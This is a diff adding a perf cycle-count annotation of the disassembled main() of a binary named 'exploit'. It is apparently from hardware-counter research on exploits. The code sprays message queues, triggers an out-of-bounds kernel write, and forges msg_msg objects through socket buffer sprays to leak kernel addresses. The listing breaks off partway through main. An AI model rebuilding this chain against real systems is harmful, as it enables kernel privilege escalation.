@@ -1,0 +1,1155 @@
+main() /home/odey/Desktop/Colorado/Research/research-example/Research-Examples/Example2/exploit
+Event: cycles
+
+Percent 804a660:   endbr32            
+        804a664:   lea     0x4(%esp),%ecx
+        804a668:   and     $0xfffffff0,%esp
+        804a66b:   pushl   -0x4(%ecx) 
+        804a66e:   push    %ebp       
+        804a66f:   mov     %esp,%ebp  
+        804a671:   push    %edi       
+        804a672:   push    %esi       
+        804a673:   push    %ebx       
+        804a674:   push    %ecx       
+        804a675:   lea     -0x5000(%esp),%eax
+        804a67c:   sub     $0x1000,%esp
+        804a682:   orl     $0x0,(%esp)
+        804a686:   cmp     %eax,%esp  
+        804a688: ↑ jne     804a67c <main+0x1c>
+        804a68a:   sub     $0x7c8,%esp
+        804a690: → call    8049c70 <__x86.get_pc_thunk.bx>
+        804a695:   add     $0x9d96b,%ebx
+        804a69b:   mov     %ecx,%eax  
+        804a69d:   mov     0x4(%eax),%eax
+        804a6a0:   mov     %eax,-0x577c(%ebp)
+        804a6a6:   mov     %gs:0x14,%eax
+        804a6ac:   mov     %eax,-0x1c(%ebp)
+        804a6af:   xor     %eax,%eax  
+        804a6b1:   movl    $0x0,-0x5720(%ebp)
+        804a6bb:   movl    $0x0,-0x571c(%ebp)
+        804a6c5:   movl    $0x0,-0x5718(%ebp)
+        804a6cf:   movl    $0x0,-0x5714(%ebp)
+        804a6d9:   movl    $0x0,-0x5710(%ebp)
+        804a6e3:   movl    $0x0,-0x570c(%ebp)
+        804a6ed:   movl    $0xffffffff,-0x5770(%ebp)
+        804a6f7:   movl    $0xffffffff,-0x576c(%ebp)
+        804a701:   sub     $0xc,%esp  
+        804a704:   lea     -0x31f54(%ebx),%eax
+        804a70a:   push    %eax       
+        804a70b: → call    805a190 <_IO_puts>
+        804a710:   add     $0x10,%esp 
+        804a713:   sub     $0xc,%esp  
+        804a716:   push    $0xa       
+        804a718: → call    805a340 <putchar>
+        804a71d:   add     $0x10,%esp 
+        804a720:   sub     $0xc,%esp  
+        804a723:   lea     -0x31f22(%ebx),%eax
+        804a729:   push    %eax       
+        804a72a: → call    805a190 <_IO_puts>
+        804a72f:   add     $0x10,%esp 
+        804a732:   sub     $0xc,%esp  
+        804a735:   lea     -0x31f04(%ebx),%eax
+        804a73b:   push    %eax       
+        804a73c: → call    805a190 <_IO_puts>
+        804a741:   add     $0x10,%esp 
+        804a744: → call    804a515 <setup_sandbox>
+        804a749:   test    %eax,%eax  
+        804a74b: ↓ js      804b81e <main+0x11be>
+        804a751:   sub     $0xc,%esp  
+        804a754:   lea     -0x31ee0(%ebx),%eax
+        804a75a:   push    %eax       
+        804a75b: → call    805a190 <_IO_puts>
+        804a760:   add     $0x10,%esp 
+        804a763:   sub     $0x4,%esp  
+        804a766:   push    $0x0       
+        804a768:   push    $0x1       
+        804a76a:   push    $0x2       
+        804a76c: → call    807a670 <__socket>
+        804a771:   add     $0x10,%esp 
+        804a774:   mov     %eax,-0x5734(%ebp)
+        804a77a:   cmpl    $0x0,-0x5734(%ebp)
+        804a781: ↓ jns     804a79a <main+0x13a>
+        804a783:   sub     $0xc,%esp  
+        804a786:   lea     -0x31eb1(%ebx),%eax
+        804a78c:   push    %eax       
+        804a78d: → call    8052d10 <perror>
+        804a792:   add     $0x10,%esp 
+        804a795: ↓ jmp     804b822 <main+0x11c2>
+        804a79a:   movl    $0x0,-0x5768(%ebp)
+        804a7a4: ↓ jmp     804a7e8 <main+0x188>
+        804a7a6:   lea     -0x56fc(%ebp),%edx
+        804a7ac:   mov     -0x5768(%ebp),%eax
+        804a7b2:   shl     $0x3,%eax  
+        804a7b5:   add     %edx,%eax  
+        804a7b7:   push    %eax       
+        804a7b8:   push    $0x0       
+        804a7ba:   push    $0x1       
+        804a7bc:   push    $0x1       
+        804a7be: → call    807a6e0 <__socketpair>
+        804a7c3:   add     $0x10,%esp 
+        804a7c6:   test    %eax,%eax  
+        804a7c8: ↓ jns     804a7e1 <main+0x181>
+        804a7ca:   sub     $0xc,%esp  
+        804a7cd:   lea     -0x31ea6(%ebx),%eax
+        804a7d3:   push    %eax       
+        804a7d4: → call    8052d10 <perror>
+        804a7d9:   add     $0x10,%esp 
+        804a7dc: ↓ jmp     804b822 <main+0x11c2>
+        804a7e1:   addl    $0x1,-0x5768(%ebp)
+        804a7e8:   cmpl    $0x3,-0x5768(%ebp)
+        804a7ef: ↑ jle     804a7a6 <main+0x146>
+        804a7f1:   movl    $0x0,-0x5764(%ebp)
+        804a7fb: ↓ jmp     804a84d <main+0x1ed>
+        804a7fd:   sub     $0x8,%esp  
+        804a800:   push    $0x3b6     
+        804a805:   push    $0x0       
+        804a807: → call    807a900 <msgget>
+        804a80c:   add     $0x10,%esp 
+        804a80f:   mov     %eax,%edx  
+        804a811:   mov     -0x5764(%ebp),%eax
+        804a817:   mov     %edx,-0x4edc(%ebp,%eax,4)
+        804a81e:   mov     -0x5764(%ebp),%eax
+        804a824:   mov     -0x4edc(%ebp,%eax,4),%eax
+        804a82b:   test    %eax,%eax  
+        804a82d: ↓ jns     804a846 <main+0x1e6>
+        804a82f:   sub     $0xc,%esp  
+        804a832:   lea     -0x31e97(%ebx),%eax
+        804a838:   push    %eax       
+        804a839: → call    8052d10 <perror>
+        804a83e:   add     $0x10,%esp 
+        804a841: ↓ jmp     804b822 <main+0x11c2>
+        804a846:   addl    $0x1,-0x5764(%ebp)
+        804a84d:   cmpl    $0xfff,-0x5764(%ebp)
+        804a857: ↑ jle     804a7fd <main+0x19d>
+        804a859:   sub     $0xc,%esp  
+        804a85c:   push    $0xa       
+        804a85e: → call    805a340 <putchar>
+        804a863:   add     $0x10,%esp 
+        804a866:   sub     $0xc,%esp  
+        804a869:   lea     -0x31e8c(%ebx),%eax
+        804a86f:   push    %eax       
+        804a870: → call    805a190 <_IO_puts>
+        804a875:   add     $0x10,%esp 
+        804a878:   sub     $0xc,%esp  
+        804a87b:   lea     -0x31e6c(%ebx),%eax
+        804a881:   push    %eax       
+        804a882: → call    805a190 <_IO_puts>
+        804a887:   add     $0x10,%esp 
+        804a88a:   movl    $0x0,-0x5760(%ebp)
+        804a894: ↓ jmp     804a902 <main+0x2a2>
+        804a896:   sub     $0x4,%esp  
+        804a899:   push    $0xfd4     
+        804a89e:   push    $0x0       
+        804a8a0:   mov     $0x80e9ca0,%eax
+        804a8a6:   push    %eax       
+        804a8a7: → call    80490c0 <.plt+0x90>
+        804a8ac:   add     $0x10,%esp 
+        804a8af:   mov     $0x80e9ca0,%eax
+        804a8b5:   lea     0x4(%eax),%eax
+        804a8b8:   movl    $0xaaaaaaaa,(%eax)
+        804a8be:   mov     $0x80e9ca0,%eax
+        804a8c4:   lea     0x8(%eax),%edx
+        804a8c7:   mov     -0x5760(%ebp),%eax
+        804a8cd:   mov     %eax,(%edx)
+        804a8cf:   mov     -0x5760(%ebp),%eax
+        804a8d5:   mov     -0x4edc(%ebp,%eax,4),%edx
+        804a8dc:   push    $0x41      
+        804a8de:   push    $0xfd4     
+        804a8e3:   mov     $0x80e9ca0,%eax
+        804a8e9:   push    %eax       
+        804a8ea:   push    %edx       
+        804a8eb: → call    8049e39 <write_msg>
+        804a8f0:   add     $0x10,%esp 
+        804a8f3:   test    %eax,%eax  
+        804a8f5: ↓ js      804b797 <main+0x1137>
+        804a8fb:   addl    $0x1,-0x5760(%ebp)
+        804a902:   cmpl    $0xfff,-0x5760(%ebp)
+  0.78  804a90c: ↑ jle     804a896 <main+0x236>
+        804a90e:   sub     $0xc,%esp  
+        804a911:   lea     -0x31e48(%ebx),%eax
+        804a917:   push    %eax       
+        804a918: → call    805a190 <_IO_puts>
+        804a91d:   add     $0x10,%esp 
+        804a920:   movl    $0x0,-0x575c(%ebp)
+        804a92a: ↓ jmp     804a998 <main+0x338>
+        804a92c:   sub     $0x4,%esp  
+        804a92f:   push    $0x3d4     
+        804a934:   push    $0x0       
+        804a936:   mov     $0x80ecc60,%eax
+        804a93c:   push    %eax       
+        804a93d: → call    80490c0 <.plt+0x90>
+        804a942:   add     $0x10,%esp 
+        804a945:   mov     $0x80ecc60,%eax
+        804a94b:   lea     0x4(%eax),%eax
+        804a94e:   movl    $0xaaaaaaaa,(%eax)
+        804a954:   mov     $0x80ecc60,%eax
+        804a95a:   lea     0x8(%eax),%edx
+        804a95d:   mov     -0x575c(%ebp),%eax
+        804a963:   mov     %eax,(%edx)
+        804a965:   mov     -0x575c(%ebp),%eax
+        804a96b:   mov     -0x4edc(%ebp,%eax,4),%edx
+        804a972:   push    $0x42      
+        804a974:   push    $0x3d4     
+        804a979:   mov     $0x80ecc60,%eax
+        804a97f:   push    %eax       
+        804a980:   push    %edx       
+        804a981: → call    8049e39 <write_msg>
+        804a986:   add     $0x10,%esp 
+        804a989:   test    %eax,%eax  
+        804a98b: ↓ js      804b79a <main+0x113a>
+        804a991:   addl    $0x1,-0x575c(%ebp)
+        804a998:   cmpl    $0xfff,-0x575c(%ebp)
+        804a9a2: ↑ jle     804a92c <main+0x2cc>
+        804a9a4:   sub     $0xc,%esp  
+        804a9a7:   lea     -0x31e24(%ebx),%eax
+        804a9ad:   push    %eax       
+        804a9ae: → call    805a190 <_IO_puts>
+        804a9b3:   add     $0x10,%esp 
+        804a9b6:   movl    $0x400,-0x5758(%ebp)
+        804a9c0: ↓ jmp     804a9f8 <main+0x398>
+        804a9c2:   mov     -0x5758(%ebp),%eax
+        804a9c8:   mov     -0x4edc(%ebp,%eax,4),%edx
+        804a9cf:   push    $0x41      
+        804a9d1:   push    $0xfd4     
+        804a9d6:   mov     $0x80e9ca0,%eax
+        804a9dc:   push    %eax       
+        804a9dd:   push    %edx       
+        804a9de: → call    8049ef2 <read_msg>
+        804a9e3:   add     $0x10,%esp 
+        804a9e6:   test    %eax,%eax  
+        804a9e8: ↓ js      804b79d <main+0x113d>
+        804a9ee:   addl    $0x400,-0x5758(%ebp)
+        804a9f8:   cmpl    $0xfff,-0x5758(%ebp)
+        804aa02: ↑ jle     804a9c2 <main+0x362>
+        804aa04:   sub     $0xc,%esp  
+        804aa07:   lea     -0x31df8(%ebx),%eax
+        804aa0d:   push    %eax       
+        804aa0e: → call    805a190 <_IO_puts>
+        804aa13:   add     $0x10,%esp 
+        804aa16:   sub     $0xc,%esp  
+        804aa19:   pushl   -0x5734(%ebp)
+        804aa1f: → call    804a059 <trigger_oob_write>
+        804aa24:   add     $0x10,%esp 
+        804aa27:   test    %eax,%eax  
+        804aa29: ↓ js      804b7a0 <main+0x1140>
+        804aa2f:   sub     $0xc,%esp  
+        804aa32:   lea     -0x31dd0(%ebx),%eax
+        804aa38:   push    %eax       
+        804aa39: → call    805a190 <_IO_puts>
+        804aa3e:   add     $0x10,%esp 
+        804aa41:   movl    $0x0,-0x5754(%ebp)
+        804aa4b: ↓ jmp     804aafb <main+0x49b>
+        804aa50:   cmpl    $0x0,-0x5754(%ebp)
+        804aa57: ↓ je      804aa6c <main+0x40c>
+        804aa59:   mov     -0x5754(%ebp),%eax
+        804aa5f:   and     $0x3ff,%eax
+        804aa64:   test    %eax,%eax  
+        804aa66: ↓ je      804aaf3 <main+0x493>
+        804aa6c:   mov     -0x5754(%ebp),%eax
+        804aa72:   mov     -0x4edc(%ebp,%eax,4),%edx
+        804aa79:   push    $0x1       
+        804aa7b:   push    $0x3d4     
+        804aa80:   mov     $0x80ecc60,%eax
+        804aa86:   push    %eax       
+        804aa87:   push    %edx       
+        804aa88: → call    8049e95 <peek_msg>
+        804aa8d:   add     $0x10,%esp 
+        804aa90:   test    %eax,%eax  
+        804aa92: ↓ js      804b821 <main+0x11c1>
+        804aa98:   mov     $0x80ecc60,%eax
+        804aa9e:   lea     0x4(%eax),%eax
+        804aaa1:   mov     (%eax),%eax
+        804aaa3:   cmp     $0xaaaaaaaa,%eax
+        804aaa8: ↓ je      804aac1 <main+0x461>
+        804aaaa:   sub     $0xc,%esp  
+        804aaad:   lea     -0x31da0(%ebx),%eax
+        804aab3:   push    %eax       
+        804aab4: → call    805a190 <_IO_puts>
+        804aab9:   add     $0x10,%esp 
+        804aabc: ↓ jmp     804b822 <main+0x11c2>
+        804aac1:   mov     $0x80ecc60,%eax
+        804aac7:   lea     0x8(%eax),%eax
+        804aaca:   mov     (%eax),%eax
+        804aacc:   cmp     %eax,-0x5754(%ebp)
+  0.64  804aad2: ↓ je      804aaf4 <main+0x494>
+        804aad4:   mov     -0x5754(%ebp),%eax
+        804aada:   mov     %eax,-0x5770(%ebp)
+        804aae0:   mov     $0x80ecc60,%eax
+        804aae6:   lea     0x8(%eax),%eax
+        804aae9:   mov     (%eax),%eax
+        804aaeb:   mov     %eax,-0x576c(%ebp)
+        804aaf1: ↓ jmp     804ab0b <main+0x4ab>
+        804aaf3:   nop                
+        804aaf4:   addl    $0x1,-0x5754(%ebp)
+        804aafb:   cmpl    $0xfff,-0x5754(%ebp)
+        804ab05: ↑ jle     804aa50 <main+0x3f0>
+        804ab0b:   cmpl    $0xffffffff,-0x5770(%ebp)
+        804ab12: ↓ jne     804ab34 <main+0x4d4>
+        804ab14:   cmpl    $0xffffffff,-0x576c(%ebp)
+        804ab1b: ↓ jne     804ab34 <main+0x4d4>
+        804ab1d:   sub     $0xc,%esp  
+        804ab20:   lea     -0x31da0(%ebx),%eax
+        804ab26:   push    %eax       
+        804ab27: → call    805a190 <_IO_puts>
+        804ab2c:   add     $0x10,%esp 
+        804ab2f: ↓ jmp     804b822 <main+0x11c2>
+        804ab34:   sub     $0x8,%esp  
+        804ab37:   pushl   -0x5770(%ebp)
+        804ab3d:   lea     -0x31d6f(%ebx),%eax
+        804ab43:   push    %eax       
+        804ab44: → call    8052c30 <_IO_printf>
+        804ab49:   add     $0x10,%esp 
+        804ab4c:   sub     $0x8,%esp  
+        804ab4f:   pushl   -0x576c(%ebp)
+        804ab55:   lea     -0x31d5d(%ebx),%eax
+        804ab5b:   push    %eax       
+        804ab5c: → call    8052c30 <_IO_printf>
+        804ab61:   add     $0x10,%esp 
+        804ab64:   sub     $0xc,%esp  
+        804ab67:   push    $0xa       
+        804ab69: → call    805a340 <putchar>
+        804ab6e:   add     $0x10,%esp 
+        804ab71:   sub     $0xc,%esp  
+        804ab74:   lea     -0x31d4b(%ebx),%eax
+        804ab7a:   push    %eax       
+        804ab7b: → call    805a190 <_IO_puts>
+        804ab80:   add     $0x10,%esp 
+        804ab83:   sub     $0xc,%esp  
+        804ab86:   lea     -0x31d30(%ebx),%eax
+        804ab8c:   push    %eax       
+        804ab8d: → call    805a190 <_IO_puts>
+        804ab92:   add     $0x10,%esp 
+        804ab95:   mov     -0x576c(%ebp),%eax
+        804ab9b:   mov     -0x4edc(%ebp,%eax,4),%edx
+        804aba2:   push    $0x42      
+        804aba4:   push    $0x3d4     
+        804aba9:   mov     $0x80ecc60,%eax
+        804abaf:   push    %eax       
+        804abb0:   push    %edx       
+        804abb1: → call    8049ef2 <read_msg>
+        804abb6:   add     $0x10,%esp 
+        804abb9:   test    %eax,%eax  
+        804abbb: ↓ js      804b7a3 <main+0x1143>
+        804abc1:   sub     $0xc,%esp  
+        804abc4:   lea     -0x31d08(%ebx),%eax
+        804abca:   push    %eax       
+        804abcb: → call    805a190 <_IO_puts>
+        804abd0:   add     $0x10,%esp 
+        804abd3:   sub     $0x4,%esp  
+        804abd6:   push    $0x2c0     
+        804abdb:   push    $0x0       
+        804abdd:   lea     -0xedc(%ebp),%eax
+        804abe3:   push    %eax       
+        804abe4: → call    80490c0 <.plt+0x90>
+        804abe9:   add     $0x10,%esp 
+        804abec:   sub     $0xc,%esp  
+        804abef:   push    $0x0       
+        804abf1:   push    $0x0       
+        804abf3:   push    $0x0       
+        804abf5:   push    $0xfd0     
+        804abfa:   push    $0x0       
+        804abfc:   push    $0x42424242
+        804ac01:   push    $0x0       
+        804ac03:   push    $0x41414141
+        804ac08:   lea     -0xedc(%ebp),%eax
+        804ac0e:   push    %eax       
+        804ac0f: → call    8049d95 <build_msg_msg>
+        804ac14:   add     $0x30,%esp 
+        804ac17:   sub     $0x4,%esp  
+        804ac1a:   push    $0x2c0     
+        804ac1f:   lea     -0xedc(%ebp),%eax
+        804ac25:   push    %eax       
+        804ac26:   lea     -0x56fc(%ebp),%eax
+        804ac2c:   push    %eax       
+        804ac2d: → call    8049f4c <spray_skbuff>
+        804ac32:   add     $0x10,%esp 
+        804ac35:   test    %eax,%eax  
+        804ac37: ↓ js      804b7a6 <main+0x1146>
+        804ac3d:   sub     $0xc,%esp  
+        804ac40:   lea     -0x31ce0(%ebx),%eax
+        804ac46:   push    %eax       
+        804ac47: → call    805a190 <_IO_puts>
+        804ac4c:   add     $0x10,%esp 
+        804ac4f:   mov     -0x5770(%ebp),%eax
+        804ac55:   mov     -0x4edc(%ebp,%eax,4),%edx
+        804ac5c:   push    $0x1       
+        804ac5e:   push    $0x1fcc    
+        804ac63:   mov     $0x80eac80,%eax
+        804ac69:   push    %eax       
+        804ac6a:   push    %edx       
+        804ac6b: → call    8049e95 <peek_msg>
+        804ac70:   add     $0x10,%esp 
+        804ac73:   test    %eax,%eax  
+        804ac75: ↓ js      804b7a9 <main+0x1149>
+        804ac7b:   mov     $0x80eac80,%eax
+        804ac81:   lea     0x404(%eax),%eax
+        804ac87:   mov     (%eax),%eax
+        804ac89:   cmp     $0xaaaaaaaa,%eax
+        804ac8e: ↓ je      804aca7 <main+0x647>
+        804ac90:   sub     $0xc,%esp  
+        804ac93:   lea     -0x31cb4(%ebx),%eax
+        804ac99:   push    %eax       
+        804ac9a: → call    805a190 <_IO_puts>
+        804ac9f:   add     $0x10,%esp 
+        804aca2: ↓ jmp     804b7b9 <main+0x1159>
+        804aca7:   mov     $0x80eac80,%eax
+        804acad:   lea     0x3d4(%eax),%eax
+        804acb3:   mov     %eax,-0x5730(%ebp)
+        804acb9:   mov     -0x5730(%ebp),%eax
+        804acbf:   mov     0x4(%eax),%edx
+        804acc2:   mov     (%eax),%eax
+        804acc4:   mov     %eax,-0x5718(%ebp)
+        804acca:   mov     %edx,-0x5714(%ebp)
+        804acd0:   mov     -0x5718(%ebp),%eax
+        804acd6:   and     $0xfff,%eax
+        804acdb:   mov     %eax,%esi  
+        804acdd:   mov     -0x5714(%ebp),%eax
+        804ace3:   and     $0x0,%eax  
+        804ace6:   mov     %eax,%edi  
+        804ace8:   mov     %esi,%eax  
+        804acea:   xor     $0x0,%ah   
+        804aced:   mov     %eax,-0x57a8(%ebp)
+        804acf3:   mov     %edi,%eax  
+        804acf5:   xor     $0x0,%ah   
+        804acf8:   mov     %eax,-0x57a4(%ebp)
+        804acfe:   mov     -0x57a8(%ebp),%esi
+        804ad04:   mov     -0x57a4(%ebp),%edi
+        804ad0a:   mov     %edi,%eax  
+        804ad0c:   or      %esi,%eax  
+        804ad0e:   test    %eax,%eax  
+        804ad10: ↓ je      804ad2a <main+0x6ca>
+        804ad12:   mov     -0x5730(%ebp),%eax
+        804ad18:   mov     0xc(%eax),%edx
+        804ad1b:   mov     0x8(%eax),%eax
+        804ad1e:   mov     %eax,-0x5718(%ebp)
+        804ad24:   mov     %edx,-0x5714(%ebp)
+        804ad2a:   sub     $0x4,%esp  
+        804ad2d:   pushl   -0x5714(%ebp)
+        804ad33:   pushl   -0x5718(%ebp)
+        804ad39:   lea     -0x31c7f(%ebx),%eax
+        804ad3f:   push    %eax       
+        804ad40: → call    8052c30 <_IO_printf>
+        804ad45:   add     $0x10,%esp 
+        804ad48:   mov     -0x5718(%ebp),%eax
+        804ad4e:   and     $0x0,%eax  
+        804ad51:   mov     %eax,-0x5788(%ebp)
+        804ad57:   mov     -0x5714(%ebp),%eax
+        804ad5d:   mov     $0x0,%ax   
+        804ad61:   mov     %eax,-0x5784(%ebp)
+        804ad67:   mov     -0x5788(%ebp),%eax
+        804ad6d:   mov     -0x5784(%ebp),%edx
+        804ad73:   mov     %eax,%ecx  
+        804ad75:   xor     $0x0,%ch   
+        804ad78:   mov     %ecx,-0x57b0(%ebp)
+        804ad7e:   mov     %edx,%eax  
+        804ad80:   xor     $0xffff0000,%eax
+        804ad85:   mov     %eax,-0x57ac(%ebp)
+        804ad8b:   mov     -0x57b0(%ebp),%esi
+        804ad91:   mov     -0x57ac(%ebp),%edi
+        804ad97:   mov     %edi,%eax  
+        804ad99:   or      %esi,%eax  
+        804ad9b:   test    %eax,%eax  
+        804ad9d: ↓ je      804adb6 <main+0x756>
+        804ad9f:   sub     $0xc,%esp  
+        804ada2:   lea     -0x31c68(%ebx),%eax
+        804ada8:   push    %eax       
+        804ada9: → call    805a190 <_IO_puts>
+        804adae:   add     $0x10,%esp 
+        804adb1: ↓ jmp     804b7b9 <main+0x1159>
+        804adb6:   sub     $0xc,%esp  
+        804adb9:   lea     -0x31c3c(%ebx),%eax
+        804adbf:   push    %eax       
+        804adc0: → call    805a190 <_IO_puts>
+        804adc5:   add     $0x10,%esp 
+        804adc8:   sub     $0x4,%esp  
+        804adcb:   push    $0x2c0     
+        804add0:   lea     -0xedc(%ebp),%eax
+        804add6:   push    %eax       
+        804add7:   lea     -0x56fc(%ebp),%eax
+        804addd:   push    %eax       
+        804adde: → call    8049fd2 <free_skbuff>
+        804ade3:   add     $0x10,%esp 
+        804ade6:   sub     $0xc,%esp  
+        804ade9:   lea     -0x31d08(%ebx),%eax
+        804adef:   push    %eax       
+        804adf0: → call    805a190 <_IO_puts>
+        804adf5:   add     $0x10,%esp 
+        804adf8:   sub     $0x4,%esp  
+        804adfb:   push    $0x2c0     
+        804ae00:   push    $0x0       
+        804ae02:   lea     -0xedc(%ebp),%eax
+        804ae08:   push    %eax       
+        804ae09: → call    80490c0 <.plt+0x90>
+        804ae0e:   add     $0x10,%esp 
+        804ae11:   mov     -0x5718(%ebp),%eax
+        804ae17:   mov     -0x5714(%ebp),%edx
+        804ae1d:   add     $0xfffffff8,%eax
+        804ae20:   adc     $0xffffffff,%edx
+        804ae23:   sub     $0xc,%esp  
+        804ae26:   push    %edx       
+        804ae27:   push    %eax       
+        804ae28:   push    $0x0       
+        804ae2a:   push    $0x1fc8    
+        804ae2f:   push    $0x0       
+        804ae31:   push    $0x42424242
+        804ae36:   push    $0x0       
+        804ae38:   push    $0x41414141
+        804ae3d:   lea     -0xedc(%ebp),%eax
+        804ae43:   push    %eax       
+        804ae44: → call    8049d95 <build_msg_msg>
+        804ae49:   add     $0x30,%esp 
+        804ae4c:   sub     $0x4,%esp  
+        804ae4f:   push    $0x2c0     
+        804ae54:   lea     -0xedc(%ebp),%eax
+        804ae5a:   push    %eax       
+        804ae5b:   lea     -0x56fc(%ebp),%eax
+        804ae61:   push    %eax       
+        804ae62: → call    8049f4c <spray_skbuff>
+        804ae67:   add     $0x10,%esp 
+        804ae6a:   test    %eax,%eax  
+        804ae6c: ↓ js      804b7ac <main+0x114c>
+        804ae72:   sub     $0xc,%esp  
+        804ae75:   lea     -0x31c14(%ebx),%eax
+        804ae7b:   push    %eax       
+        804ae7c: → call    805a190 <_IO_puts>
+        804ae81:   add     $0x10,%esp 
+        804ae84:   mov     -0x5770(%ebp),%eax
+        804ae8a:   mov     -0x4edc(%ebp,%eax,4),%edx
+        804ae91:   push    $0x1       
+        804ae93:   push    $0x1fcc    
+        804ae98:   mov     $0x80eac80,%eax
+        804ae9e:   push    %eax       
+        804ae9f:   push    %edx       
+        804aea0: → call    8049e95 <peek_msg>
+        804aea5:   add     $0x10,%esp 
+        804aea8:   test    %eax,%eax  
+        804aeaa: ↓ js      804b7af <main+0x114f>
+        804aeb0:   mov     $0x80eac80,%eax
+        804aeb6:   lea     0x1004(%eax),%eax
+        804aebc:   mov     (%eax),%eax
+        804aebe:   cmp     $0xaaaaaaaa,%eax
+        804aec3: ↓ je      804aedc <main+0x87c>
+        804aec5:   sub     $0xc,%esp  
+        804aec8:   lea     -0x31bf4(%ebx),%eax
+        804aece:   push    %eax       
+        804aecf: → call    805a190 <_IO_puts>
+        804aed4:   add     $0x10,%esp 
+        804aed7: ↓ jmp     804b7b9 <main+0x1159>
+        804aedc:   mov     $0x80eac80,%eax
+        804aee2:   lea     0xfd4(%eax),%eax
+        804aee8:   mov     %eax,-0x5730(%ebp)
+        804aeee:   mov     -0x5730(%ebp),%eax
+        804aef4:   mov     0x4(%eax),%edx
+        804aef7:   mov     (%eax),%eax
+        804aef9:   mov     %eax,-0x5718(%ebp)
+        804aeff:   mov     %edx,-0x5714(%ebp)
+        804af05:   mov     -0x5718(%ebp),%eax
+        804af0b:   and     $0x3ff,%eax
+        804af10:   mov     %eax,-0x5790(%ebp)
+        804af16:   mov     -0x5714(%ebp),%eax
+        804af1c:   and     $0x0,%eax  
+        804af1f:   mov     %eax,-0x578c(%ebp)
+        804af25:   mov     -0x5790(%ebp),%eax
+        804af2b:   mov     -0x578c(%ebp),%edx
+        804af31:   mov     %eax,%ecx  
+        804af33:   xor     $0x0,%ch   
+        804af36:   mov     %ecx,-0x57b8(%ebp)
+        804af3c:   mov     %edx,%eax  
+        804af3e:   xor     $0x0,%ah   
+        804af41:   mov     %eax,-0x57b4(%ebp)
+        804af47:   mov     -0x57b8(%ebp),%esi
+        804af4d:   mov     -0x57b4(%ebp),%edi
+        804af53:   mov     %edi,%eax  
+        804af55:   or      %esi,%eax  
+        804af57:   test    %eax,%eax  
+        804af59: ↓ je      804af73 <main+0x913>
+        804af5b:   mov     -0x5730(%ebp),%eax
+        804af61:   mov     0xc(%eax),%edx
+        804af64:   mov     0x8(%eax),%eax
+        804af67:   mov     %eax,-0x5718(%ebp)
+        804af6d:   mov     %edx,-0x5714(%ebp)
+        804af73:   addl    $0xfffffc00,-0x5718(%ebp)
+        804af7d:   adcl    $0xffffffff,-0x5714(%ebp)
+        804af84:   sub     $0x4,%esp  
+        804af87:   pushl   -0x5714(%ebp)
+        804af8d:   pushl   -0x5718(%ebp)
+        804af93:   lea     -0x31c7f(%ebx),%eax
+        804af99:   push    %eax       
+        804af9a: → call    8052c30 <_IO_printf>
+        804af9f:   add     $0x10,%esp 
+        804afa2:   mov     -0x5718(%ebp),%eax
+        804afa8:   and     $0xffff,%eax
+        804afad:   mov     %eax,-0x5798(%ebp)
+        804afb3:   mov     -0x5714(%ebp),%eax
+        804afb9:   mov     $0x0,%ax   
+        804afbd:   mov     %eax,-0x5794(%ebp)
+        804afc3:   mov     -0x5798(%ebp),%eax
+        804afc9:   mov     -0x5794(%ebp),%edx
+        804afcf:   mov     %eax,%ecx  
+        804afd1:   xor     $0x0,%ch   
+        804afd4:   mov     %ecx,-0x57c0(%ebp)
+        804afda:   mov     %edx,%eax  
+        804afdc:   xor     $0xffff0000,%eax
+        804afe1:   mov     %eax,-0x57bc(%ebp)
+        804afe7:   mov     -0x57c0(%ebp),%esi
+        804afed:   mov     -0x57bc(%ebp),%edi
+        804aff3:   mov     %edi,%eax  
+        804aff5:   or      %esi,%eax  
+        804aff7:   test    %eax,%eax  
+        804aff9: ↓ je      804b012 <main+0x9b2>
+        804affb:   sub     $0xc,%esp  
+        804affe:   lea     -0x31c68(%ebx),%eax
+        804b004:   push    %eax       
+        804b005: → call    805a190 <_IO_puts>
+        804b00a:   add     $0x10,%esp 
+        804b00d: ↓ jmp     804b7b9 <main+0x1159>
+        804b012:   sub     $0xc,%esp  
+        804b015:   push    $0xa       
+        804b017: → call    805a340 <putchar>
+        804b01c:   add     $0x10,%esp 
+        804b01f:   sub     $0xc,%esp  
+        804b022:   lea     -0x31bca(%ebx),%eax
+        804b028:   push    %eax       
+        804b029: → call    805a190 <_IO_puts>
+        804b02e:   add     $0x10,%esp 
+        804b031:   sub     $0xc,%esp  
+        804b034:   lea     -0x31c3c(%ebx),%eax
+        804b03a:   push    %eax       
+        804b03b: → call    805a190 <_IO_puts>
+        804b040:   add     $0x10,%esp 
+        804b043:   sub     $0x4,%esp  
+        804b046:   push    $0x2c0     
+        804b04b:   lea     -0xedc(%ebp),%eax
+        804b051:   push    %eax       
+        804b052:   lea     -0x56fc(%ebp),%eax
+        804b058:   push    %eax       
+        804b059: → call    8049fd2 <free_skbuff>
+        804b05e:   add     $0x10,%esp 
+        804b061:   sub     $0xc,%esp  
+        804b064:   lea     -0x31d08(%ebx),%eax
+        804b06a:   push    %eax       
+        804b06b: → call    805a190 <_IO_puts>
+        804b070:   add     $0x10,%esp 
+        804b073:   sub     $0x4,%esp  
+        804b076:   push    $0x2c0     
+        804b07b:   push    $0x0       
+        804b07d:   lea     -0xedc(%ebp),%eax
+        804b083:   push    %eax       
+        804b084: → call    80490c0 <.plt+0x90>
+        804b089:   add     $0x10,%esp 
+        804b08c:   sub     $0xc,%esp  
+        804b08f:   push    $0x0       
+        804b091:   push    $0x0       
+        804b093:   push    $0x0       
+        804b095:   push    $0x0       
+        804b097:   pushl   -0x5714(%ebp)
+        804b09d:   pushl   -0x5718(%ebp)
+        804b0a3:   pushl   -0x5714(%ebp)
+        804b0a9:   pushl   -0x5718(%ebp)
+        804b0af:   lea     -0xedc(%ebp),%eax
+        804b0b5:   push    %eax       
+        804b0b6: → call    8049d95 <build_msg_msg>
+        804b0bb:   add     $0x30,%esp 
+        804b0be:   sub     $0x4,%esp  
+        804b0c1:   push    $0x2c0     
+        804b0c6:   lea     -0xedc(%ebp),%eax
+        804b0cc:   push    %eax       
+        804b0cd:   lea     -0x56fc(%ebp),%eax
+        804b0d3:   push    %eax       
+        804b0d4: → call    8049f4c <spray_skbuff>
+        804b0d9:   add     $0x10,%esp 
+        804b0dc:   test    %eax,%eax  
+        804b0de: ↓ js      804b7b2 <main+0x1152>
+        804b0e4:   sub     $0xc,%esp  
+        804b0e7:   lea     -0x31bb0(%ebx),%eax
+        804b0ed:   push    %eax       
+        804b0ee: → call    805a190 <_IO_puts>
+        804b0f3:   add     $0x10,%esp 
